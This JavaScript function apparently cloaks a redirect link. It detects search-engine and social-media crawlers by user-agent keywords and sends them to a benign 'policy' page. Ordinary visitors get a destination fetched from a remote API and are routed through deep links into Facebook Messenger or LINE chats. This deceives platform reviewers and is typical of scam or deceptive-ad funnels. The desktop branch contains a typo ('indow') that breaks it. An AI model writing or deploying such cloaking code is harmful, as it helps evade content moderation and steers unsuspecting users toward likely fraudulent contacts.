function g() {
  function detectBot() {
    const uA = navigator.userAgent.toLowerCase();
    const botKeywords = [
      "googlebot", // Google
      "bingbot", // Bing
      "facebookexternalhit", // Facebook
      "tiktokbot", // TikTok
      "slurp", // Yahoo
      "duckduckbot", // DuckDuckGo
      "baiduspider", // Baidu
      "yandexbot", // Yandex
      "sogou", // Sogou
      "exabot", // Exalead
      "facebot", // Facebook Bot
      "ia_archiver", // Alexa
    ];
    return botKeywords.some((bot) => uA.includes(bot));
  }

  const isBot = detectBot();

  if (isBot) {
    window.location.href = "https://nhungoc.sbs/policy";
  } else {
    // User ID Extraction Function
    function pR(url) {
      return url.split("/")[url.split("/").length - 1];
    }

    function rU(redirect) {
      const uA = navigator.userAgent.toLowerCase();
      const isAndroid = uA.includes("android");
      const isIOS = /iphone|ipad|ipod/.test(uA);
      const s = redirect.social ? redirect.social : "NONE";
      console.log({ redirect, uA, isAndroid, s });

      if (isAndroid) {
        let iL = "";
        switch (s) {
          case "FACEBOOK":
            iL = `intent:${redirect.children[0].url}#Intent;package=com.facebook.orca;end`;
            break;
          case "LINE":
            const id = pR(redirect.children[0].url);
            if (redirect.variantUrl === "PERSON") {
              iL = `line://ti/p/${id}`;
            } else if (redirect.variantUrl === "GROUP") {
              iL = `line://ti/g/${id}`;
            } else {
              iL = redirect.children[0].url;
            }
            break;
          default:
            iL = redirect.children[0].url;
            break;
        }
        window.location.href = iL;
      } else if (isIOS) {
        let iosInt = "";
        switch (s) {
          case "FACEBOOK":
            const match =
              redirect.children[0].url.match(/m\.me\/(?:j\/)?(\d+)/);
            const uid = match ? match[1] : null;
            iosInt = `fb-messenger://user-thread/${uid}`;
            break;
          case "LINE":
            const id = pR(redirect.children[0].url);
            if (redirect.variantUrl === "PERSON") {
              iosInt = `line://ti/p/${id}`;
            } else if (redirect.variantUrl === "GROUP") {
              iosInt = `line://ti/g/${id}`;
            } else {
              iosInt = redirect.children[0].url;
            }
            break;
          default:
            iosInt = redirect.children[0].url;
            break;
        }
        window.location.href = iosInt;
      } else {
        indow.location.href = redirect.children[0].url;
      }
    }

    if (slug) {
      $.ajax({
        url: `https://api-admin.devt.id.vn/api/v1/vpcs-link/redirect/${slug}`,
        method: "GET",
        dataType: "json",
        success: function (res) {
          if (res.statusCode === 200) {
            let rUObject = res.data;
            let rUObjectC = rUObject.children[0];
            if (
              !rUObjectC.url.startsWith("http://") &&
              !rUObjectC.url.startsWith("https://")
            ) {
              rUObjectC.url = `https://${rUObjectC.url}`;
            }
            url = rUObject;
            if (url.isActive) {
              rU(url);
            }
          } else {
            console.error("Failed to fetch redirect link.");
          }
        },
        error: function (err) {
          console.error("Error fetching data:", err);
        },
      });
    }
  }
}
